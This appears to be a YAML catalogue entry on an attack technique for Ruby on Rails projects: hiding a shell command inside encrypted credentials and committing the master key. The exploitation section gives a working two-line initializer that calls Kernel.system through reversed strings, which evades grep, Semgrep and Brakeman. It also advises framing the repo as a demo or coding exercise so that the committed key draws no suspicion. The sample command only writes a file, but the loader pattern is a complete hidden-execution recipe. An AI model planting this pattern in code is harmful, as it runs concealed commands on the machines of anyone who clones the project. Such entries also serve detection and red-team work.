name: Ruby on Rails Encrypted Credentials
id: ruby-rails-credentials
description: >
  Rails ships encrypted credentials (`config/credentials.yml.enc` decrypted at boot using
  a `config/master.key` file, or a `RAILS_MASTER_KEY` environment variable.

  Because the file is encrypted, it looks like an opaque blob rather than
  source code, so reviewers skip straight past it — nobody diffs or reads
  ciphertext. If the master key is committed alongside it (easy to justify in
  a repo framed as a "sample app", "coding exercise", or "playground
  project"), the whole thing decrypts cleanly in any checkout. An attacker
  only needs one arbitrary-looking value inside the credentials store and a
  single small snippet elsewhere in the codebase that reads and executes it,
  which on its own looks unremarkable since credentials are meant to be
  read.
tags:
  - ruby
  - rails
  - credentials
  - encryption
  - code-execution
  - config

exploitation: |
  Rails credentials are edited with the built-in encrypted editor, which
  decrypts the file, opens it in `$EDITOR`, and re-encrypts on save:

  ```bash
  EDITOR="nano" bin/rails credentials:edit
  ```

  A malicious value is added as an ordinary-looking key, indistinguishable
  from any other secret once encrypted:

  ```yaml
  # config/credentials.yml.enc (decrypted view)
  secret_key_base: 3f4a08e0574770c793d695b90516174063f507a7705852b8f16661e239b0f2e0147615d9324fc9480248b282175d7e0c1594a3cac6cdc99195ee37a6cf...
  payload: "echo 'hacked' > /tmp/hacked.txt"
  ```

  Committing `config/master.key` (normally gitignored) alongside the `.enc`
  file means anyone who clones the repo can decrypt it transparently — Rails
  does this automatically as soon as the key is present, no extra step
  required. In a repo pitched as a demo, tutorial, or coding challenge, a
  committed master key raises little suspicion since there's an
  understandable narrative for "just clone and run it."

  Somewhere else in the codebase — an initializer, a Rake task, a model
  callback — a small snippet reads the value out of credentials and executes
  it.

  ```ruby
  # config/initializers/payload.rb
  c = Object.const_get("lenreK".reverse())
  c.send("metsys".reverse(), Rails.application.credentials.dig(:payload))
  ```

  The constant and method names are reversed strings (`Kernel`, `system`) to
  avoid showing up in a plain-text grep for `Kernel` or `system(`, so the
  call site alone doesn't reveal what it does — the actual command only
  exists as ciphertext inside `credentials.yml.enc`, decrypted at runtime.
  The payload runs the moment this file loads, on any `bin/rails` invocation.

  Semgrep or even brakeman do not flag the 2 line snippet for code execution

references:
  - url: https://guides.rubyonrails.org/security.html#custom-credentials
    description: Rails guide to encrypted credentials and master key handling
  - url: https://edgeguides.rubyonrails.org/security.html#environmental-security
    description: Rails security guide on managing secrets and the master key
